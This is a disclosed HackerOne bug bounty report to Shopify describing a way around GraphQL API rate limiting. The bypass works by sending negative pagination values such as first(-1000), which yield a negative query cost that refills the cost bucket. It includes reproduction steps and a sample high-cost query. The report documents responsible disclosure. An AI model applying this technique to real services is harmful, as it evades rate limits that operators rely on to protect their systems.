# Bypass GraphQL rate limit by abusing negative cost queries

## Report Details
- **Report ID**: 481518
- **URL**: https://hackerone.com/reports/481518
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-01-17T16:51:07.923Z
- **Disclosed**: 2019-01-24T15:29:24.263Z

## Reporter
- **Username**: emitrani
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi security team,

While looking into the graphql app I noticed an interesting implementation where each app has a bucket of query cost they are allowed to used in a given time with a certain refresh rate associated with it.

The details can be found at https://help.shopify.com/en/api/graphql-admin-api/call-limit

Now Using the app I noticed by calling something like `first(-100)` will give you a negative cost 
{F408086}

This doesn't give you more than the maximum amount however you can deplete your resources down to 50 and then use a negative query to fill it back up to a maximum of 1000 to keep querying indefinitely.

In order to reproduce I used a high cost query like:
```
{
  appInstallations(first: 10) {
    edges {
      node {
        id
        uninstallUrl
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        accessScopes {
          description
          handle
        }
        launchUrl
        app {
          pricingDetailsSummary
          apiKey
          banner {
            altText
            metafields(first: 2) {
              edges {
                node {
                  description
                  value
                  namespace
                  id
                }
              }
            }
          }
          handle
          features
          pricingDetails
          published
          feedback {
            messages {
              message
            }
            link {
              url
            }
          }
        }
      }
    }
  }
}
```
And hit sent 10-15 times at https://emitrani.myshopify.com/admin/apps/shopify-graphiql-app

After that change one of the `first` parameters into `(first: -1000)` and try a regular query again and you will see it succeeds as the pool will be back up to full.

## Impact

It is possible to leverage the logic error to bypass GraphQL rate limiting.

Best,
Eray

## Attachments
- Screen_Shot_2019-01-17_at_11.24.35_AM.png
